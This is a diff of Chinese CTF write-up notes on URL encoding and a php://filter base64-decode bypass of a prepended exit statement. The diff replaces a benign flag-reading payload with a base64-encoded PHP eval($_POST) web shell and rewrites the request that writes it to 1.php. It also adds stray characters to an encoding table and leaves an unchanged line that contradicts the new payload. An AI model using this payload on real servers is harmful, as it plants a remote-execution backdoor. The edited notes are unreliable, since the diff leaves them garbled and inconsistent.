@@ -88,7 +88,7 @@ $	24%	|I	49%	|i	69%|µ	%B5	|Þ	%DE|
 4	34%	|Y	59%	|y	79%|Ë	%CB	|î	%EE|
 5	35%	|Z	%5A	|z	%7A|Ì	%CC	|ï	%EF|
 6	36%	| 	 	| 	 	| 	 	|ð	%F0|
-7	37%	|?	%3F	|{	%7B|Í	%CD	|ñ	%F1|
+7	37%	|?	%3F	|{	%7B|Í	%CD	|ñ	%F1|5858
 8	38%	|@	40%	||	%7C|Î	%CE	|ò	%F2|
 9	39%	|[	%5B	|}	%7D|Ï	%CF	|ó	%F3|
 :	%3A	|\	%5C	|~	%7E|Ð	%D0	|ô	%F4|
@@ -100,7 +100,7 @@ $	24%	|I	49%	|i	69%|µ	%B5	|Þ	%DE|
 
 
 ```
-
+%25%58%25%58XCTF
 
 **3. URLDECOD二次编码**
 ```php
@@ -945,7 +945,7 @@ echo "今天天气不错";
 我们如果使用　　file=php://filter/write=convert.base64-decode　　来进行对file变量的处理，既以base64的编码来读。
 因为<?php exit;?>中"<、?、;、>"等符号解码时都会被忽略，所以命令就变成了-->    “phpexit”。
 
-将命令用base64编码，得到PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==，然后在原有的（phpexit）基础上添加上述base64代码，(****这里我们为了让其成为八位，所以任意在后面加一个a)得到
+将命令用base64编码，得到PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=，然后在原有的（phpexit）基础上添加上述base64代码，(****这里我们为了让其成为八位，所以任意在后面加一个a)得到
 
 `phpexitaPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==`
 
@@ -955,7 +955,7 @@ echo "今天天气不错";
 
 凑一下就得到flag
 ```
-code=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg=&filename=php://filter/write=convert.base64-decode/resource=1.php
+?code=PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4=&filename=php://filter/write=convert.base64-decode/resource=1.php
 ```
 
 ### [BJDCTF2020]Easy MD5
